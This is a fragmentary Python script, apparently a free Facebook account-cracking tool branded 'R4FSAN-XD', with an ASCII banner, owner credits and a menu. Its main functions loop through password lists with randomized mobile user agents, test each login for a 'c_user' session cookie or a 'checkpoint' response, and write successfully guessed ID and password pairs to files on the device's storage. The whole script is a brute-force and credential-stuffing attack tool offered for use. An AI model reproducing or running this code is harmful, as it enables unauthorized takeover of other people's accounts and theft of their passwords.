...
logo=("""
      \033[97;1md8888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db 
      \033[97;1m88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
      \033[97;188oobY' 88ooo88 88ooo   `8bo.   88ooo88 88V8o 88 
      \033[97;188`8b   88~~~88 88~~~     `Y8b. 88~~~88 88 V8o88 
      \033[97;188 `88. 88   88 88      db   8D 88   88 88  V888 
      \033[97;188   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
\033[97;1m==========================
\033[97;1m[√]  Owner    : Riyad Mahfuz
\033[97;1m[√]  Facebook : Xiyad.404
\033[97;1m[√]  Version  : 1.0
\033[97;1m[√]  Git hop  : xiyad69
...
def fia():    
			print(logo)
			print('\x1b[97;1m[√] TOOLS  VERSION :\x1b[1;92m 1.1 ')
			print('[√]Tools Type : \x1b[91;1m FREE')
			linex()
			...
			if xd in ['1','01']:
				...
				os.system('RAFSAN-XD.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
			elif xd in ['4','04']:
				os.system(f'xdg-open https://facebook.com/groups/3206414299669908//');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[R4FSAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[R4FSAN-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/R4FSAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in R4FSAN:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[R4FSAN-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/R4FSAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[R4FSAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[R4FSAN-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[R4FSAN-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/R4FSAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mR4FSAN-XD\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
	...
	'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[R4FSAN-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[R4FSAN-OK] '+uid+' | '+ps+'\33[0;97m')
